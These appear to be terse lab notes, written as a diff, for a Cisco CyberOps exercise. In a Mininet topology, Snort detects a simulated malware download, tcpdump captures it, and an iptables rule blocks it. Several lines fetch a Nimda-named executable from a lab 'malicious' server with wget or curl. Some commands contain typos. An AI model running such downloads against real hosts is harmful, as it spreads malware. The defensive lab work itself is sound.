@@ -1,0 +1,47 @@
+Launch Oracle VirtualBox and change the CyberOps Workstation for Bridged mode
+open a terminal and configure its network by executing the sh script.
+sudo ./lab.support.files/scripts/configure_as_dhcp.sh
+Use Ctrl+C to stop the pings
+sudo./lab.support.files/scripts/cyberops_extended_topo_no_fw.py
+mininet>xterm R1
+
+From R1’s shell
+./lab.support.files/scripts/start_snort.sh
+
+open shells for hosts H5 and H10.
+mininet>xterm H5
+mininet>xterm H10
+
+On H10
+./lab.support.files/scripts/mal_server_start.sh
+ netstat -tunpa
+
+ new R1 terminal tab( mininet>xterm R1 )
+ tail -f /var/log/snort/alert
+
+ From H5
+ wget 209.165.202.133:6666/W32.Nimda.Amm.exe OR curl -O 209.165.202.133:6666/W32.Nimda.Amm.exe
+ (check R1)
+ tcpdump –i H5-eth0 –w nimda.download.pcap&
+ press enter few times
+ wget 209.165.202.133:6666/W32.Nimda.Amm.exe
+ ctrl+C
+ fgtcpdump -i h5-eth0 -w nimda.download.pcap
+ ls -l
+
+ third R1 terminal window
+ mininet>xterm R1
+ In R1
+ iptables -L -v
+ iptables -I FORWARD -p tcp -d 209.165.202.133 --dport 6666 -j DROP
+ wait some time
+ iptables -L -v
+
+ on H5
+ wget 209.165.202.133:6666/W32.Nimda.Amm.exe
+
+in terminal
+quit
+sudomn –c
+ 
+ 
